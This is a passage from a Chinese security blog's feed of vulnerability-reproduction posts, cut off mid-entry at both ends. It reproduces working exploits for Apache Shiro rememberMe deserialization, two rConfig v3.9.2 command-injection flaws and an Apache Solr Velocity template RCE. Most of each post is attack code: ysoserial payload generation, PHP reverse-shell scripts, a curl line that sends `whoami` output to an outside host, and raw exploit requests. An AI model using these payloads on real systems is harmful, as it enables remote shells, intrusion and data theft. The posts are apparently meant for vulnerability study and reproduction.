class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span>, <span class="string">'JRMPClient'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])    </span><br><span class="line"><span class="keyword">print</span> <span class="string">"rememberMe=&#123;0&#125;"</span>.format(payload.decode())</span><br></pre></td></tr></table></figure><p>使用方法<code>python shiro_rce.py ip:port</code>，其中ip和port为上面启动<code>ysoserial</code>JRMP的ip地址和端口号</p><p><img src="https://i.loli.net/2019/11/19/SrUHc9ejEMCgTpG.png" alt></p><p>然后进行抓包，将cookie中的<code>remeberMe</code>值替换即可。</p><p><img src="https://i.loli.net/2019/11/19/FrNWE3SYXj1kdI4.png" alt></p><p>然后便可收到反弹回的shell</p><p><img src="https://i.loli.net/2019/11/27/8GpNBT1gW6jJOSA.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;在官网中可以得到该漏洞的描述，主要原因是因为shiro默认使用了&lt;code&gt;CookieRememb
      
    
    </summary>
    
      <category term="web安全" scheme="http://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="java" scheme="http://zhengbao.wang/tags/java/"/>
    
      <category term="反序列化" scheme="http://zhengbao.wang/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>rConfig远程代码执行漏洞复现</title>
    <link href="http://zhengbao.wang/rConfig%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://zhengbao.wang/rConfig远程代码执行漏洞复现/</id>
    <published>2019-11-04T07:49:37.000Z</published>
    <updated>2019-11-04T09:19:17.075Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p> rConfig是一个开源网络设备配置管理解决方案，可以方便网络工程师快速、频繁管理网络设备快照。 </p><p>近期国外安全研究员Askar公布了rConfig的两个RCE漏洞，并表示该漏洞未得到rConfig的确认修复。</p><p>影响至最新版本<code>v3.9.2</code></p><p>下面对该漏洞进行复现。</p><h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><h3 id="未授权代码执行"><a href="#未授权代码执行" class="headerlink" title="未授权代码执行"></a>未授权代码执行</h3><p>第一个漏洞无需登陆即可触发，漏洞发生在<code>install/lib/ajaxHandlers/ajaxServerSettingsChk.php</code></p><p>漏洞处代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$rootTestCmd1 = <span class="string">'sudo -S -u '</span> . $rootUname . <span class="string">' chmod 0777 /home 2&amp;amp;amp;gt;&amp;amp;amp;amp;1'</span>;    <span class="comment">// line 12</span></span><br><span class="line">exec($rootTestCmd1, $cmdOutput, $err);    <span class="comment">// line 13</span></span><br></pre></td></tr></table></figure><p>通过传入参数<code>rootUname</code>可控制进入<code>exec</code>的执行语句。</p><p>payload传入<code>;id#</code>即可执行<code>id</code>命令并得到回显。</p><p>该漏洞虽然未授权即可利用，但测试过程中该文件大部分情况下均为删除。</p><p><code>Askar</code>给出利用脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Exploit Title: rConfig v3.9.2 unauthenticated Remote Code Execution</span></span><br><span class="line"><span class="comment"># Date: 18/09/2019</span></span><br><span class="line"><span class="comment"># Exploit Author: Askar (@mohammadaskar2)</span></span><br><span class="line"><span class="comment"># CVE : CVE-2019-16662</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://rconfig.com/</span></span><br><span class="line"><span class="comment"># Software link: https://rconfig.com/download</span></span><br><span class="line"><span class="comment"># Version: v3.9.2</span></span><br><span class="line"><span class="comment"># Tested on: CentOS 7.7 / PHP 7.2.22</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] Usage : ./exploit.py target ip port"</span></span><br><span class="line">    exit()</span><br><span class="line"> </span><br><span class="line">target = sys.argv[<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line">ip = sys.argv[<span class="number">2</span>]</span><br><span class="line"> </span><br><span class="line">port = sys.argv[<span class="number">3</span>]</span><br><span class="line"> </span><br><span class="line">payload = quote(<span class="string">''';php -r '$sock=fsockopen("&#123;0&#125;",&#123;1&#125;);exec("/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3");'#'''</span>.format(ip, port))</span><br><span class="line"> </span><br><span class="line">install_path = target + <span class="string">"/install"</span></span><br><span class="line"> </span><br><span class="line">req = requests.get(install_path, verify=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> req.status_code == <span class="number">404</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[-] Installation directory not found!"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[-] Exploitation failed !"</span></span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">elif</span> req.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] Installation directory found!"</span></span><br><span class="line">url_to_send = target + <span class="string">"/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname="</span> + payload</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Triggering the payload"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Check your listener !"</span></span><br><span class="line"> </span><br><span class="line">requests.get(url_to_send, verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h3 id="后台无回显命令执行"><a href="#后台无回显命令执行" class="headerlink" title="后台无回显命令执行"></a>后台无回显命令执行</h3><p>第二个漏洞需要有一个认证账号，登陆后，漏洞触发点在<code>lib/crud/search.crud.php</code></p><p>payload</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchTerm=anything&amp;catCommand=<span class="string">""</span>&amp;&amp;$(<span class="string">`sleep 5`</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>该利用点执行命令后，无回显，因此可以使用<code>sleep</code>函数进行延迟判断</p><p>在这里我使用dnslog方式获取到命令回显</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""</span>&amp;&amp;$(curl <span class="symbol">http:</span>/<span class="regexp">/zhengbao.wang/</span><span class="string">`whoami`</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/11/04/9vPoEOzhHyjs7MD.png" alt></p><p>成功获取到<code>whoami</code>执行结果为<code>apache</code></p><p><img src="https://i.loli.net/2019/11/04/vsYbexLoJTO6PNR.png" alt></p><p>同样<code>Askar</code>给出了反弹shell的利用方式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Exploit Title: rConfig v3.9.2 Authenticated Remote Code Execution</span></span><br><span class="line"><span class="comment"># Date: 18/09/2019</span></span><br><span class="line"><span class="comment"># Exploit Author: Askar (@mohammadaskar2)</span></span><br><span class="line"><span class="comment"># CVE : CVE-2019-16663</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://rconfig.com/</span></span><br><span class="line"><span class="comment"># Software link: https://rconfig.com/download</span></span><br><span class="line"><span class="comment"># Version: v3.9.2</span></span><br><span class="line"><span class="comment"># Tested on: CentOS 7.7 / PHP 7.2.22</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">6</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] Usage : ./exploit.py target username password ip port"</span></span><br><span class="line">    exit()</span><br><span class="line"> </span><br><span class="line">target = sys.argv[<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line">username = sys.argv[<span class="number">2</span>]</span><br><span class="line"> </span><br><span class="line">password = sys.argv[<span class="number">3</span>]</span><br><span class="line"> </span><br><span class="line">ip = sys.argv[<span class="number">4</span>]</span><br><span class="line"> </span><br><span class="line">port = sys.argv[<span class="number">5</span>]</span><br><span class="line"> </span><br><span class="line">request = requests.session()</span><br><span class="line"> </span><br><span class="line">login_info = &#123;</span><br><span class="line">    <span class="string">"user"</span>: username,</span><br><span class="line">    <span class="string">"pass"</span>: password,</span><br><span class="line">    <span class="string">"sublogin"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">login_request = request.post(</span><br><span class="line">    target+<span class="string">"/lib/crud/userprocess.php"</span>,</span><br><span class="line">     login_info,</span><br><span class="line">     verify=<span class="literal">False</span>,</span><br><span class="line">     allow_redirects=<span class="literal">True</span></span><br><span class="line"> )</span><br><span class="line"> </span><br><span class="line">dashboard_request = request.get(target+<span class="string">"/dashboard.php"</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> dashboard_request.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] LoggedIn successfully"</span></span><br><span class="line">    payload = <span class="string">'''""&amp;amp;&amp;amp;php -r '$sock=fsockopen("&#123;0&#125;",&#123;1&#125;);exec("/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3");'#'''</span>.format(ip, port)</span><br><span class="line">    encoded_request = target+<span class="string">"/lib/crud/search.crud.php?searchTerm=anything&amp;amp;catCommand=&#123;0&#125;"</span>.format(quote(payload))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] triggering the payload"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] Check your listener !"</span></span><br><span class="line">    exploit_req = request.get(encoded_request)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">elif</span> dashboard_request.status_code == <span class="number">302</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[-] Wrong credentials !"</span></span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure><h2 id="0x02-参考链接"><a href="#0x02-参考链接" class="headerlink" title="0x02 参考链接"></a>0x02 参考链接</h2><p><a href="https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/" target="_blank" rel="noopener">https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt; rConfig是一个开源网络设备配置管理解决方案，可以方便网络工程师快速、频繁管理网络设备快照。 
      
    
    </summary>
    
      <category term="web安全" scheme="http://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码执行" scheme="http://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>apache solr远程命令执行漏洞复现</title>
    <link href="http://zhengbao.wang/apache-solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://zhengbao.wang/apache-solr远程命令执行漏洞复现/</id>
    <published>2019-10-31T07:05:41.000Z</published>
    <updated>2019-10-31T07:52:41.678Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p> Apache Solr 是一个开源的搜索服务器，近日，国外安全研究院s00py爆出了一个apache solr的velocity的一个远程命令执行的0day，截至目前，官方未发布补丁。</p><h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><p>漏洞poc在s00py已公布，详见<a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a></p><p>首先在<code>Core Admin</code>查看应用路径，此处为<code>logadmin</code></p><p><img src="https://i.loli.net/2019/10/31/UcnBwslZrhtNXky.png" alt></p><p>然后访问查看该应用<code>config</code>文件是否可以访问</p><p><img src="https://i.loli.net/2019/10/31/vh51ETfHnJLloyx.png" alt></p><p>然后利用s00py公布的poc修改向config发送json配置继续修改</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/solr/test/config</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: solr:8983</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "update-queryresponsewriter": &#123;</span><br><span class="line">    "startup": "lazy",</span><br><span class="line">    "name": "velocity",</span><br><span class="line">    "class": "solr.VelocityResponseWriter",</span><br><span class="line">    "template.base.dir": "",</span><br><span class="line">    "solr.resource.loader.enabled": "true",</span><br><span class="line">    "params.resource.loader.enabled": "true"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/31/wq9YnsPRyK34iaV.png" alt></p><p>修改成功后可利用poc执行任意代码</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /solr/test/select?q=<span class="number">1</span>&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=<span class="meta">%23set</span>(<span class="variable">$x</span>=<span class="meta">%27</span><span class="meta">%27</span>)+<span class="meta">%23set</span>(<span class="variable">$rt</span>=<span class="variable">$x</span>.class.forName(<span class="meta">%27java</span><span class="built_in">.lang</span>.Runtime<span class="meta">%27</span>))+<span class="meta">%23set</span>(<span class="variable">$chr</span>=<span class="variable">$x</span>.class.forName(<span class="meta">%27java</span><span class="built_in">.lang</span>.Character<span class="meta">%27</span>))+<span class="meta">%23set</span>(<span class="variable">$str</span>=<span class="variable">$x</span>.class.forName(<span class="meta">%27java</span><span class="built_in">.lang</span>.String<span class="meta">%27</span>))+<span class="meta">%23set</span>(<span class="variable">$ex</span>=<span class="variable">$rt</span>.getRuntime().exec(<span class="meta">%27id</span><span class="meta">%27</span>))+<span class="variable">$ex</span>.waitFor()+<span class="meta">%23set</span>(<span class="variable">$out</span>=<span class="variable">$ex</span>.getInputStream())+<span class="meta">%23foreach</span>(<span class="variable">$i</span>+<span class="keyword">in</span>+[<span class="number">1</span>..<span class="variable">$out</span>.available()])<span class="variable">$str</span>.valueOf(<span class="variable">$chr</span>.toChars(<span class="variable">$out</span>.read()))<span class="meta">%23end</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/31/Ixa41HtfqoKSZrn.png" alt></p><h2 id="0x03-验证脚本"><a href="#0x03-验证脚本" class="headerlink" title="0x03 验证脚本"></a>0x03 验证脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_collection</span><span class="params">(url)</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">admin_solr = url + <span class="string">'/solr/admin/cores'</span></span><br><span class="line">res = requests.get(admin_solr)</span><br><span class="line"><span class="comment">#print res.text</span></span><br><span class="line">colls = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> json.loads(res.text)[<span class="string">"status"</span>]:</span><br><span class="line">colls.append(key)</span><br><span class="line"><span class="keyword">if</span> len(colls) &gt; <span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Get Collection Success For :"</span> +url</span><br><span class="line"><span class="keyword">return</span> colls</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>  </span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[-] Get Collection Error For : "</span>+url</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_config</span><span class="params">(url,coll)</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">config_url = url +<span class="string">"/solr/"</span>+coll+<span class="string">"/config"</span></span><br><span class="line">headers = &#123;<span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>, <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>, <span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line">json=&#123;<span class="string">"update-queryresponsewriter"</span>: &#123;<span class="string">"class"</span>: <span class="string">"solr.VelocityResponseWriter"</span>, <span class="string">"name"</span>: <span class="string">"velocity"</span>, <span class="string">"params.resource.loader.enabled"</span>: <span class="string">"true"</span>, <span class="string">"solr.resource.loader.enabled"</span>: <span class="string">"true"</span>, <span class="string">"startup"</span>: <span class="string">"lazy"</span>, <span class="string">"template.base.dir"</span>: <span class="string">""</span>&#125;&#125;</span><br><span class="line">res = requests.post(config_url, headers=headers, json=json)</span><br><span class="line"><span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Set Config Success For :"</span> +url+<span class="string">"|"</span>+coll</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[-] Set Config Failed For :"</span>+url+<span class="string">"|"</span>+coll</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[-] Set Config Error For :"</span>+url+<span class="string">"|"</span>+coll</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_cmd</span><span class="params">(url,coll,cmd=<span class="string">"echo boo"</span>)</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">poc= <span class="string">"/solr/"</span>+coll+<span class="string">"/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27"</span>+cmd+<span class="string">"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"</span></span><br><span class="line">headers = &#123;<span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>, <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>&#125;</span><br><span class="line">res = requests.get(url+poc, headers=headers)</span><br><span class="line"><span class="comment">#print "[+] :" +res.text</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'boo'</span> <span class="keyword">in</span> res.text:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Vuluable : "</span>+url+<span class="string">"|"</span>+coll</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Not Vuluable : "</span>+url+<span class="string">"|"</span>+coll</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Run Cmd Error : "</span>+url+<span class="string">"|"</span>+coll</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = get_collection(url)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">url = <span class="string">'http://zhengbao.wang'</span></span><br><span class="line">colls = get_collection(url)</span><br><span class="line"><span class="keyword">if</span> colls:</span><br><span class="line"><span class="keyword">for</span> coll <span class="keyword">in</span> colls:</span><br><span class="line"><span class="keyword">if</span> set_config(url,coll):</span><br><span class="line">run_cmd(url,coll)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/31/I4HrXp2c6OGtnoP.png" alt></p><h2 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h2><ul><li>对solr增加访问控制</li><li>及时关注官方补丁</li></ul><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt; Apache Solr 是一个开源的搜索服务器，近日，国外安全研究院s00py爆出了一个apach
      
    
    </summary>
    
      <category term="web安全" scheme="http://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码执行" scheme="http://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>泛微OA数据库配置信息泄露漏洞</title>
